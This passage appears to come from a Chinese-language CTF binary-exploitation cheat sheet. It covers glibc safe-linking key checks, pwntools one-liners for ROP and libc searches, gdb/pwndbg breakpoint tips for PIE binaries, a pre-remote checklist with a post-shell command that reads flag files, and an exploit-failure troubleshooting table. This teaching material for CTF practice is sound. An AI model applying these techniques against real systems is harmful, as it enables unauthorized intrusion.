\NormalTok{printf}\OperatorTok{(}\StringTok{"header \textgreater{}\textgreater{}12 = }\SpecialCharTok{\%\#018lx\textbackslash{}n}\StringTok{"}\OperatorTok{,} \OperatorTok{((}\DataTypeTok{uint64\_t}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]} \OperatorTok{{-}} \BaseNTok{0x10}\OperatorTok{)} \OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\OperatorTok{);}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ gcc {-}O0 t.c {-}o t \&\& ./t                              \# 系統 glibc 2.44}
\NormalTok{user   = 0x56246a6c1000   header = 0x56246a6c0ff0}
\NormalTok{stored      = 0x000000056246a6c1}
\NormalTok{user   \textgreater{}\textgreater{}12 = 0x000000056246a6c1  MATCH}
\NormalTok{header \textgreater{}\textgreater{}12 = 0x000000056246a6c0  NO}

\NormalTok{$ ./pwn4/ld{-}linux{-}x86{-}64.so.2 {-}{-}library{-}path pwn4 t     \# 題目附的 glibc 2.39}
\NormalTok{user   = 0x5555602f7000   header = 0x5555602f6ff0}
\NormalTok{stored      = 0x00000005555602f7}
\NormalTok{user   \textgreater{}\textgreater{}12 = 0x00000005555602f7  MATCH}
\NormalTok{header \textgreater{}\textgreater{}12 = 0x00000005555602f6  NO}
\end{Highlighting}
\end{Shaded}

⇒ \textbf{glibc 2.39 與 2.44 都一樣：key ＝
\texttt{user\ \allowbreak{}位址\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12} ＝
\texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}。}
（不跨頁時兩者剛好相同，所以你照「標頭 \textgreater\textgreater{}
12」算\textbf{大多數時候}也會對 ------ 但那是運氣，會在看到
\texttt{stored} 對不上時找不到原因。）
（上面的位址是某一次的執行結果，ASLR 每次不同；\textbf{重點是
\texttt{user\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12} 永遠 MATCH、
\texttt{header\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12} 永遠
NO}。完整可編譯的程式在 \texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} §5.4。）

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{9. pwntools
常用一行}\label{pwntools-ux5e38ux7528ux4e00ux884c}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{p }\OperatorTok{=}\NormalTok{ process(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{)}
\NormalTok{p }\OperatorTok{=}\NormalTok{ remote(}\StringTok{\textquotesingle{}h\textquotesingle{}}\NormalTok{, }\DecValTok{1234}\NormalTok{)}
\NormalTok{p.sendafter(}\StringTok{b\textquotesingle{}\textgreater{} \textquotesingle{}}\NormalTok{, }\StringTok{b\textquotesingle{}x\textquotesingle{}}\NormalTok{)}\OperatorTok{;}\NormalTok{  p.sendlineafter(}\StringTok{b\textquotesingle{}\textgreater{} \textquotesingle{}}\NormalTok{, }\StringTok{b\textquotesingle{}x\textquotesingle{}}\NormalTok{)}
\NormalTok{p.recvuntil(}\StringTok{b\textquotesingle{}\textgreater{} \textquotesingle{}}\NormalTok{)}\OperatorTok{;}\NormalTok{        p.recvn(}\DecValTok{8}\NormalTok{)}\OperatorTok{;}\NormalTok{   p.recvrepeat(}\DecValTok{2}\NormalTok{)}
\NormalTok{p64(}\BaseNTok{0x401234}\NormalTok{)}\OperatorTok{;}\NormalTok{             u64(}\StringTok{b\textquotesingle{}12345678\textquotesingle{}}\NormalTok{)}
\NormalTok{flat([}\BaseNTok{0x1}\NormalTok{, }\BaseNTok{0x2}\NormalTok{, }\BaseNTok{0x3}\NormalTok{])}
\NormalTok{cyclic(}\DecValTok{100}\NormalTok{)}\OperatorTok{;}\NormalTok{               cyclic\_find(}\BaseNTok{0x6161616b}\NormalTok{)}
\NormalTok{ELF(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{).symbols[}\StringTok{\textquotesingle{}main\textquotesingle{}}\NormalTok{]}
\NormalTok{ELF(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{).got[}\StringTok{\textquotesingle{}printf\textquotesingle{}}\NormalTok{]}
\NormalTok{ROP(ELF(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{)).find\_gadget([}\StringTok{\textquotesingle{}pop rdi\textquotesingle{}}\NormalTok{,}\StringTok{\textquotesingle{}ret\textquotesingle{}}\NormalTok{])}
\BuiltInTok{next}\NormalTok{(ELF(}\StringTok{\textquotesingle{}./libc.so.6\textquotesingle{}}\NormalTok{).search(}\StringTok{b\textquotesingle{}/bin/sh\textquotesingle{}}\NormalTok{))}
\NormalTok{log.success(}\StringTok{\textquotesingle{}FLAG: }\SpecialCharTok{\%s}\StringTok{\textquotesingle{}} \OperatorTok{\%}\NormalTok{ flag)}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{10. gdb / pwndbg}\label{gdb-pwndbg}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{b *0x401234                \# ← 這行只對「non{-}PIE」有效！}
\NormalTok{                           \#   PIE 檔每次載入位址都不同（0x401234 通常根本沒映射），}
\NormalTok{                           \#   中斷點永遠不會命中 → 見底下「PIE 檔怎麼下中斷點」}
\NormalTok{c}
\NormalTok{si / ni}
\NormalTok{x/20gx $rsp}
\NormalTok{x/10i $rip}
\NormalTok{info registers}
\NormalTok{p/x $rdi}
\NormalTok{vmmap                     \# 記憶體映射（找 libc base / PIE base）}
\NormalTok{telescope $rsp 20}
\NormalTok{heap / bins / vis\_heap\_chunks}
\end{Highlighting}
\end{Shaded}

\begin{quote}
\textbf{PIE 檔怎麼下中斷點}（\texttt{\$\allowbreak{}base} \textbf{不是} gdb
內建變數，一定要自己先 \texttt{set}， 否則 \texttt{b\ \allowbreak{}*\$\allowbreak{}base+0x1234}
會直接回
\texttt{Argument\ \allowbreak{}to\ \allowbreak{}arithmetic\ \allowbreak{}operation\ \allowbreak{}not\ \allowbreak{}a\ \allowbreak{}number\ \allowbreak{}or\ \allowbreak{}boolean.}
------ 實測）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{starti                      \# 停在 ld 的入口（程式還沒跑，但已經被載入了）}
\NormalTok{info proc mappings          \# 找主程式的映射區間（或 vmmap，若裝了 pwndbg/gef）}
\NormalTok{set $base = 0x555555554000  \# 填你看到的起始位址}
\NormalTok{b *$base+0x1234}
\end{Highlighting}
\end{Shaded}

實測（\texttt{gdb\ \allowbreak{}-\allowbreak{}q\ \allowbreak{}-\allowbreak{}batch\ \allowbreak{}-\allowbreak{}ex\ \allowbreak{}starti\ \allowbreak{}-\allowbreak{}ex\ \allowbreak{}\textquotesingle{}\allowbreak{}info\ \allowbreak{}proc\ \allowbreak{}mappings\textquotesingle{}\allowbreak{}\ \allowbreak{}-\allowbreak{}ex\ \allowbreak{}\textquotesingle{}\allowbreak{}set\ \allowbreak{}\$\allowbreak{}base\ \allowbreak{}=\ \allowbreak{}0x555555554000\textquotesingle{}\allowbreak{}\ \allowbreak{}-\allowbreak{}ex\ \allowbreak{}\textquotesingle{}\allowbreak{}b\ \allowbreak{}*\$\allowbreak{}base+0x1234\textquotesingle{}\allowbreak{}\ \allowbreak{}./\allowbreak{}pwn2/\allowbreak{}mad\_\allowbreak{}libs}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x0000555555554000 0x0000555555555000 0x1000 0x0 r--p  /…/mad_libs   ← 這就是 base
Breakpoint 1 at 0x555555555234                                      ← 成功
\end{Verbatim}

※提示 沒有 ASLR 時（gdb 預設會關掉 ASLR）PIE 的 base 幾乎都是
\texttt{0x555555554000}， 但\textbf{遠端 / 沒關 ASLR
時每次都不一樣}，所以一定要 \texttt{info\ \allowbreak{}proc\ \allowbreak{}mappings} 看一眼再填。
\end{quote}

\begin{quote}
上面 3 個（\texttt{vmmap} / \texttt{telescope} / \texttt{heap}）是
\textbf{pwndbg} 的指令，原生 gdb 沒有 → 沒裝 pwndbg 的話用
\texttt{info\ \allowbreak{}proc\ \allowbreak{}mappings}、\texttt{x/\allowbreak{}20gx\ \allowbreak{}\$\allowbreak{}rsp}、\texttt{x/\allowbreak{}40gx\ \allowbreak{}\textless{}\allowbreak{}heap\ \allowbreak{}位址\textgreater{}\allowbreak{}}
代替。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{11.
打遠端前檢查清單}\label{ux6253ux9060ux7aefux524dux6aa2ux67e5ux6e05ux55ae}

\begin{itemize}
\tightlist
\item[$\square$]
  本地能穩定拿到 shell（跑 3 次都成功）
\item[$\square$]
  \texttt{REMOTE} 參數可用
\item[$\square$]
  用題目附的 libc（\texttt{ld\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}library-\allowbreak{}path\ \allowbreak{}.} 或
  \texttt{patchelf}）
\item[$\square$]
  offset 都有用 gdb 驗證過（不是猜的）
\item[$\square$]
  有處理 stack 16-byte 對齊
\item[$\square$]
  有 leak 的話確認遠端 leak 值合理（不是 0 或明顯垃圾）
\item[$\square$]
  拿 shell 後會自動
  \texttt{cat\ \allowbreak{}flag.\allowbreak{}txt\ \allowbreak{}/\allowbreak{}flag\ \allowbreak{}/\allowbreak{}home/*/\allowbreak{}flag.\allowbreak{}txt\ \allowbreak{}2\textgreater{}\allowbreak{}/\allowbreak{}dev/\allowbreak{}null;\ \allowbreak{}ls\ \allowbreak{}-\allowbreak{}la;\ \allowbreak{}id}
\item[$\square$]
  程式不會因為 stdin 是 \texttt{/\allowbreak{}dev/\allowbreak{}null} 而卡住（不要用
  \texttt{interactive()} 當唯一出口）
\end{itemize}

\begin{quote}
※查 最後確認一次：\textbf{在題目目錄裡跑}（\texttt{exploit.\allowbreak{}py}
常用相對路徑 \texttt{./\allowbreak{}chal}）， 或用
\texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh\ \allowbreak{}pwnN}（它會自動 \texttt{cd} 並帶上正確 port）。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{12. 常見失敗症狀 →
原因對照表}\label{ux5e38ux898bux5931ux6557ux75c7ux72c0-ux539fux56e0ux5c0dux7167ux8868}

新手 90\% 的時間在對著看不懂的錯誤發呆。先查這張表再去改 exploit：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
你看到的
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
最可能的原因
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
先檢查
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{***\ \allowbreak{}stack\ \allowbreak{}smashing\ \allowbreak{}detected\ \allowbreak{}***} / SIGABRT & canary
沒對上（沒寫回、或 payload 整體差一格） & 洩漏到的 canary 有沒有「完整 8
bytes」寫回？payload 有沒有差一格？ \\
\texttt{SIGSEGV}，而位址看起來像正常位址（\texttt{0x55…} /
\texttt{0x7f…}） & 鏈跳到對的地方但\textbf{16-byte 對齊錯了} →
\texttt{movaps} 炸 & 用 gdb 在 \texttt{system} 第一道指令看
\texttt{rsp\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xf} 是不是 \texttt{8} \\
\texttt{SIGSEGV}，位址是 \texttt{0x0} 或 \texttt{0x41414141…} &
回傳位址被蓋成垃圾又 \texttt{ret}（鏈太短／結尾沒收） & 鏈最後放一個
\texttt{0} 或 \texttt{exit@plt} 當結尾 \\
位址對、指令對，但 \texttt{\%\allowbreak{}hn} 沒寫進去 / 直接炸 &
\texttt{context.\allowbreak{}arch} 沒設（pwntools 用 4-byte 對齊算錯參數編號） &
開頭加
\texttt{context.\allowbreak{}arch\ \allowbreak{}=\ \allowbreak{}\textquotesingle{}\allowbreak{}amd64\textquotesingle{}\allowbreak{}}；確認
\texttt{fmtstr\_\allowbreak{}payload} 的 \texttt{offset} = 掃到的編號 \\
程式卡住不動、連錯誤都沒有 &
讀進來的長度比你想的多（\textbf{協定長度欄位是大端}、或 \texttt{read}
吃掉了下一段） &
\texttt{cat\ \allowbreak{}/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}syscall} 看它
\texttt{read} 要幾個 byte \\
\texttt{{[}ERROR{]}\ \allowbreak{}\textquotesingle{}\allowbreak{}./\allowbreak{}chal\textquotesingle{}\allowbreak{}\ \allowbreak{}does\ \allowbreak{}not\ \allowbreak{}exist}
& 在錯的目錄執行 & \texttt{cd} 進題目目錄，或用
\texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh} \\
\texttt{error:\allowbreak{}\ \allowbreak{}externally-\allowbreak{}managed-\allowbreak{}environment} & PEP 668（系統 Python
不准 pip 裝東西） & 用發行版套件或 venv（見
\texttt{wp/\allowbreak{}00\_\allowbreak{}基礎知識\_\allowbreak{}從零開始.\allowbreak{}md} §2） \\
\texttt{{[}ERROR{]}\ \allowbreak{}kernel\ \allowbreak{}architecture\ \allowbreak{}must\ \allowbreak{}be\ \allowbreak{}specified} & 用
\texttt{SigreturnFrame()} 前沒設 \texttt{context.\allowbreak{}arch} &
\texttt{context.\allowbreak{}arch\ \allowbreak{}=\ \allowbreak{}\textquotesingle{}\allowbreak{}amd64\textquotesingle{}\allowbreak{}} \\
\texttt{No\ \allowbreak{}symbol\ \allowbreak{}table\ \allowbreak{}is\ \allowbreak{}loaded} & 對 \textbf{stripped} binary 用
\texttt{b\ \allowbreak{}*main+42} 這種符號寫法 & 用 \texttt{objdump} 找 offset，改成
\texttt{b\ \allowbreak{}*0x401234}（non-PIE）或先 \texttt{set\ \allowbreak{}\$\allowbreak{}base}（PIE，見
§10） \\
中斷點下了卻永遠不停 & PIE binary 寫死位址（\texttt{b\ \allowbreak{}*0x401234}） &
\texttt{starti} → \texttt{info\ \allowbreak{}proc\ \allowbreak{}mappings} →
\textbf{\texttt{set\ \allowbreak{}\$\allowbreak{}base\ \allowbreak{}=\ \allowbreak{}\textless{}\allowbreak{}你看到的位址\textgreater{}\allowbreak{}}}
→ \texttt{b\ \allowbreak{}*\$\allowbreak{}base+0x…}（\texttt{\$\allowbreak{}base} 不是內建變數，跳過
\texttt{set} 會直接報錯） \\
遠端才失敗、本地成功 & 遠端 libc 版本不同 / 有 seccomp / flag 路徑不同 &
用題目附的 libc；\texttt{seccomp-\allowbreak{}tools\ \allowbreak{}dump}；改用 \texttt{execve}
或「借別人的手」讀 flag \\
\end{longtable}
}

\end{document}
